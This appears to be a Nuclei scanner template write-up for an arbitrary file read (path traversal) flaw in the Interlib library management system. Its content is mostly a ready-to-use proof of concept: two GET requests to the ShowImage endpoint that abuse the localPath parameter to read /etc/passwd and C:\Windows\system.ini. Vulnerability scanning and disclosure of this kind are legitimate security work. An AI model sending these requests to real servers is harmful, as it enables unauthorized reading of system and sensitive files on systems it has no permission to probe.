# Nuclei Template: Interlib - Local File Inclusion
**Template ID:** interlib-fileread
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`interlib-fileread.yaml`)

## Vulnerability Information & PoC

## Description
Interlib has an arbitrary file read vulnerability. Attackers can use the vulnerability to read any file.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/interlib/report/ShowImage?localPath=etc/passwd
GET {{BaseURL}}/interlib/report/ShowImage?localPath=C:\Windows\system.ini
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6/%E5%9B%BE%E5%88%9B%E8%BD%AF%E4%BB%B6%20%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AB%99%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
- https://forum.butian.net/article/217
